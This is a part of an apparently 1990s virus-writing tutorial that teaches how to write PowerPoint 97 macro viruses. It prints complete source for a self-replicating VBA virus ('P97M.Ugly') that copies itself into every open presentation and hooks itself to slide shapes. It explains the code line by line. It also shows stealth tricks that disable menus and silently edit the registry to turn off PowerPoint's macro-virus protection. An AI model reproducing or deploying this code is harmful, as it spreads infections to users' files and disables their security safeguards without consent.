<b>
.Introduction to PowerPoint macros</b>

    Hi there!  Welcome to the Power  Point part.  First I would like to say
that I don't like Power Point much, so don't expect too much. ;P Ok, PP has
no template where we could get some kind of resisdent features.  So we need
to run direct  action as in Access. Hmm ... I don't know if .ppt  files are
traded a lot so I am not sure if PP macros really spread.

    Other than in  Word,  we can't access the  registry directly and as you
will see, some things will change.

    If you never  coded anything in VBA  then I recommend you  to read also
the introduction to Word, if you have read the Word part (I hope so) go on.

<b>
.Infection hooks for PowerPoint</b>

    Here we have the main  change to all other kind  of macro bugs. PP does
not have any build in hook we could use. So how do we get our virus execut-
ed? The answer is easy,  we hook it to events  concerning the active slide.
I won't explain this here to far, so just check the example below.

 Sub AnySubName()

 [...VirusCode...]

 End Sub

    As you see we can use every procedure in a module. We just need to hook
this sub with  the shapes on our slide.  You will see how it's  done in the
next section.

<b>
.The PowerPoint module macro</b>

    In this section I will  give you a simple sample how a macro for Power-
Point could look. This one is very basic and was written for this tutorial.

---[ code starts here ]----------------------------------------------------

 Sub Ugly()
 On Error Resume Next
 Set host = ActivePresentation.VBProject.VBComponents("ylgu").CodeModule
 vcode = host.Lines(1, host.countoflines)

 For Each newhost In Presentations
  If newhost.VBProject.VBComponents(host).Name &lt;&gt; host Then
   newhost.VBProject.VBComponents.Add(1).Name = host
   newhost.VBProject.VBComponents(host).CodeModule.InsertLines 1, vcode
    For Each ShapeHook In newhost.Slides(newhost.Slides.Count).Shapes
     If ShapeHook.ActionSettings(ppMouseOver).Action = 0 Then _
      ShapeHook.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
       ShapeHook.ActionSettings(ppMouseOver).Run = "Ugly"
    Next
  End If
 Next

 If Day(Now()) = 1 Then MsgBox "Have you ever woke up screaming?" & _
 vbCr & "Have you ever woke up alone?", vbInformation, "powerpoint.Ugly"
 End Sub
 'P97M.Ugly
 'Written for 'A phreaky macro primer' by jackie / Metaphase

---[ code ends here ]------------------------------------------------------

    What you see here  is a working example  of a macro for PowerPoint.  As
usual I will walk now through the code.

---------------------------------------------------------------------------
Sub Ugly()
---------------------------------------------------------------------------

    This is the sub that is  going to contain our viral code.  You will see
later in code that we are going to hook this sub.

---------------------------------------------------------------------------
On Error Resume Next
Set host = ActivePresentation.VBProject.VBComponents("ylgu").CodeModule
vcode = host.Lines(1, host.countoflines)
---------------------------------------------------------------------------

    First line contains our error handler. You already know it. In the 2nd
line we create an object containing our module. We need it later. After all
we save our viral code into a variable.

---------------------------------------------------------------------------
For Each newhost In Presentations
If newhost.VBProject.VBComponents(host).Name &lt;&gt; host Then
---------------------------------------------------------------------------

    All we  want is to infect  all open presentations.  For this purpose we
create a nice For Each-Next loop.  Then we check if our module does already
exist in the the current presentation.

---------------------------------------------------------------------------
newhost.VBProject.VBComponents.Add(1).Name = host
newhost.VBProject.VBComponents(host).CodeModule.InsertLines 1, vcode
---------------------------------------------------------------------------

    We add a module to the presentation we want to infect and after that we
insert our viral code into the new module.

---------------------------------------------------------------------------
For Each ShapeHook In newhost.Slides(newhost.Slides.Count).Shapes
 If ShapeHook.ActionSettings(ppMouseOver).Action = 0 Then _
  ShapeHook.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
  ShapeHook.ActionSettings(ppMouseOver).Run = "Ugly"
Next
---------------------------------------------------------------------------

    Here is now the  interesting part, here we hook our  macro with all the
shapes on the infected presentation. First of all a loop for each shape. If
there's no action set on the shape we hook it to our viral subroutine.

---------------------------------------------------------------------------
End If
Next

If Day(Now()) = 1 Then MsgBox "Have you ever woke up screaming?" & _
vbCr & "Have you ever woke up alone?", vbInformation, "powerpoint.Ugly"
End Sub
---------------------------------------------------------------------------

    End If and back  to the next presentation.  The code below is a paylaod
as you can see.

    As you see, infecting PowerPoint is very easy, but I don't like it. Now
I am gonna say a little about stealth.


<b>.Stealth technics for PowerPoint</b> 

    Stealth in PowerPoint works equal to the stealth in Excel, etc. Here's
shown how.

 CommandBars("Tools").Controls(11).Enabled = False
 CommandBars("Tools").Controls(14).Enabled = False

    This should disable 2 important menus. To disable the virus protection
of PowerPoint we can use the same trick as we use in Excel.

    Open "c:\power.reg" For Output As 1
    Print #1, "REGEDIT4"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\" _
                & "Office\8.0\PowerPoint\Options]"
    Print #1, """MacroVirusProtection""=dword:00000000"
    Close 1

    Shell "regedit /s c:\power.reg",vbHide

    You see,  the stealth possibilities are very  rare but you can also use
some tricks that I  have explained in the Word section.  I am talking about
the trick were you set new background colours in the VBEditor.


    I am very sorry that this part is the shittiest of them all,  but must
say that I really don't like PowerPoint. :) Now spotlight on Access 97.

                               -End Of Part #4-
